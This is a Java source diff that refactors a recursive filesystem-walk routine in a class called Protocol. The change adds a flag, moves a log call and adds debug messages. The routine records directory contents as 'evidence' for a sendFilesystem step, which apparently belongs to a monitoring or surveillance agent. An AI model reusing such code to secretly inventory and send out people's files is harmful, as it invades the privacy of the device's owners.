@@ -359,8 +359,7 @@ public abstract class Protocol implements iProtocol {
 				path = path.substring(0, path.length() - 2);
 			}
 			if (path.startsWith("/")) {
-				Protocol.saveFilesystemLog(fsLog, path);
-				expandPath(fsLog, path, depth);
+				expandPath(fsLog, path, depth, true);
 			} else {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Error: sendFilesystem: strange path, ignoring it. " + path);//$NON-NLS-1$
@@ -382,7 +381,7 @@ public abstract class Protocol implements iProtocol {
 			Check.requires(depth > 0, "wrong recursion depth"); //$NON-NLS-1$
 		}
 		saveRootLog(fsLog); // depth 0
-		expandPath(fsLog, "/", depth); //$NON-NLS-1$
+		expandPath(fsLog, "/", depth, false); //$NON-NLS-1$
 
 	}
 
@@ -432,11 +431,16 @@ public abstract class Protocol implements iProtocol {
 			flags = 1;
 			String[] list = file.list();
 			if (list == null || list.length == 0) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (saveFilesystemLog), empty dir");
+				}
 				flags = 3;
 			}
 		} else {
-			flags = 2;
-
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (saveFilesystemLog), simple file");
+			}
+			//flags = 2;
 		}
 
 		databuffer.writeInt(flags);
@@ -484,7 +488,7 @@ public abstract class Protocol implements iProtocol {
 	 * @param path  the path
 	 * @param depth the depth
 	 */
-	private static void expandPath(final EvidenceBuilder fsLog, final String path, final int depth) {
+	private static void expandPath(final EvidenceBuilder fsLog, final String path, final int depth, boolean saveFirst) {
 		if (Cfg.DEBUG) {
 			Check.requires(depth > 0, "wrong recursion depth"); //$NON-NLS-1$
 		}
@@ -502,6 +506,9 @@ public abstract class Protocol implements iProtocol {
 		}
 		final File dir = new File(path);
 		if (dir.isDirectory()) {
+			if(saveFirst) {
+				Protocol.saveFilesystemLog(fsLog, path);
+			}
 
 			final String[] files = dir.list();
 			if (files == null) {
@@ -522,7 +529,7 @@ public abstract class Protocol implements iProtocol {
 				if (!blackListDir.contains(dPath)) {
 					final boolean isDir = Protocol.saveFilesystemLog(fsLog, dPath);
 					if (isDir && depth > 1) {
-						expandPath(fsLog, dPath, depth - 1);
+						expandPath(fsLog, dPath, depth - 1, false);
 					}
 				} else {
 					if (Cfg.DEBUG) {
